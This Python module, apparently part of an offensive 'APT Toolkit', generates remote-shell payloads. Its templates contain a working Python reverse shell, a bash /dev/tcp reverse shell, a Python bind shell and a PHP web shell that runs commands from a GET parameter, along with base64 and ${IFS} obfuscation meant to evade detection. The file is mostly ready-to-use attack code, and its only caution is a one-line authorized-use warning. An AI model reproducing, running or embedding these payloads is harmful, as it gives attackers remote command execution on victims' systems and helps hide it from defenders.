"""
Shell Generator Module for APT Toolkit

Features:
- Multiple shell types (reverse, bind, web)
- Multiple language support
- Customizable parameters
- Obfuscation options
- Thread-safe operation

WARNING: This module should only be used for authorized penetration testing.
Unauthorized use of generated payloads may be illegal.
"""

import base64
import random
import threading
from typing import Dict, List, Optional, Tuple, Any
from enum import Enum, auto

from src.core.engine import ScanModule, ScanTarget, ScanResult, ScanStatus
from src.utils.logger import get_logger
from src.utils.crypto import CryptoHelpers
from src.utils.config import config
from src.core.event_system import event_system, Event
from src.utils.helpers import ErrorHelpers

logger = get_logger(__name__)

class ShellType(Enum):
    """Shell payload types"""
    REVERSE = auto()
    BIND = auto()
    WEB = auto()
    STAGED = auto()

class ShellLanguage(Enum):
    """Shell language options"""
    PYTHON = auto()
    BASH = auto()
    POWERSHELL = auto()
    PERL = auto()
    PHP = auto()

class ShellGenerator(ScanModule):
    """Advanced shell payload generator"""
    
    def __init__(self):
        super().__init__()
        self.module_name = "shell_generator"
        self._templates = self._load_templates()
        self._stop_event = threading.Event()
        
    def _load_templates(self) -> Dict[Tuple[ShellType, ShellLanguage], str]:
        """Load shell code templates"""
        return {
            (ShellType.REVERSE, ShellLanguage.PYTHON): (
                "import socket,os,subprocess\n"
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
                "s.connect(('{host}',{port}))\n"
                "os.dup2(s.fileno(),0)\n"
                "os.dup2(s.fileno(),1)\n"
                "os.dup2(s.fileno(),2)\n"
                "subprocess.call(['/bin/sh','-i'])"
            ),
            (ShellType.REVERSE, ShellLanguage.BASH): (
                "bash -i >& /dev/tcp/{host}/{port} 0>&1"
            ),
            (ShellType.BIND, ShellLanguage.PYTHON): (
                "import socket,os,subprocess\n"
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
                "s.bind(('0.0.0.0',{port}))\n"
                "s.listen(1)\n"
                "conn,addr=s.accept()\n"
                "os.dup2(conn.fileno(),0)\n"
                "os.dup2(conn.fileno(),1)\n"
                "os.dup2(conn.fileno(),2)\n"
                "subprocess.call(['/bin/sh','-i'])"
            ),
            (ShellType.WEB, ShellLanguage.PHP): (
                "<?php system($_GET['cmd']); ?>"
            )
        }
        
    def initialize(self) -> None:
        """Initialize generator resources"""
        logger.info(f"Initialized {self.module_name}")
        
    def cleanup(self) -> None:
        """Cleanup generator resources"""
        self._stop_event.set()
        logger.info(f"Cleaned up {self.module_name}")
        
    def validate_target(self, target: ScanTarget) -> bool:
        """Validate target is appropriate for shell generation"""
        if not target.metadata:
            return False
        return True
        
    def _generate_shell(self, shell_type: ShellType, language: ShellLanguage, 
                      params: Dict[str, Any], obfuscate: bool = False) -> str:
        """Generate shell code based on parameters"""
        template = self._templates.get((shell_type, language))
        if not template:
            raise ValueError(f"No template for {shell_type.name} {language.name}")
            
        # Apply parameters to template
        shell_code = template.format(**params)
        
        # Basic obfuscation
        if obfuscate:
            if language == ShellLanguage.PYTHON:
                shell_code = self._obfuscate_python(shell_code)
            elif language == ShellLanguage.BASH:
                shell_code = self._obfuscate_bash(shell_code)
                
        return shell_code
        
    def _obfuscate_python(self, code: str) -> str:
        """Obfuscate Python code"""
        # Simple base64 encoding for demonstration
        encoded = base64.b64encode(code.encode()).decode()
        return f"exec(__import__('base64').b64decode('{encoded}').decode())"
        
    def _obfuscate_bash(self, code: str) -> str:
        """Obfuscate Bash code"""
        # Simple character substitution
        return code.replace("/", "$(echo /)").replace(" ", "${IFS}")
        
    def execute(self, target: ScanTarget) -> ScanResult:
        """
        Generate shell payloads based on target parameters
        
        Args:
            target: ScanTarget specifying shell generation parameters
            
        Returns:
            ScanResult with generated payloads
        """
        if not self.validate_target(target):
            logger.error("Invalid shell generation target")
            return ScanResult(
                target=target,
                data={"error": "Invalid target"},
                status=ScanStatus.FAILED
            )
            
        try:
            shell_type = ShellType[target.metadata.get("type", "REVERSE").upper()]
            language = ShellLanguage[target.metadata.get("language", "PYTHON").upper()]
            params = target.metadata.get("params", {})
            obfuscate = target.metadata.get("obfuscate", False)
            
            logger.info(f"Generating {shell_type.name} shell in {language.name}")
            
            shell_code = self._generate_shell(shell_type, language, params, obfuscate)
            
            return ScanResult(
                target=target,
                data={
                    "type": shell_type.name,
                    "language": language.name,
                    "payload": shell_code,
                    "obfuscated": obfuscate,
                    "size": len(shell_code),
                    "params": params
                },
                status=ScanStatus.COMPLETED
            )
            
        except Exception as e:
            logger.error(f"Shell generation failed: {str(e)}", exc_info=True)
            return ScanResult(
                target=target,
                data={"error": str(e)},
                status=ScanStatus.FAILED
            )

# Module registration
def init_module():
    return ShellGenerator()

# Example usage:
# generator = ShellGenerator()
# target = ScanTarget(
#     metadata={
#         "type": "REVERSE",
#         "language": "PYTHON",
#         "params": {"host": "192.168.1.100", "port": 4444},
#         "obfuscate": True
#     }
# )
# result = generator.execute(target)
# print(result.data["payload"])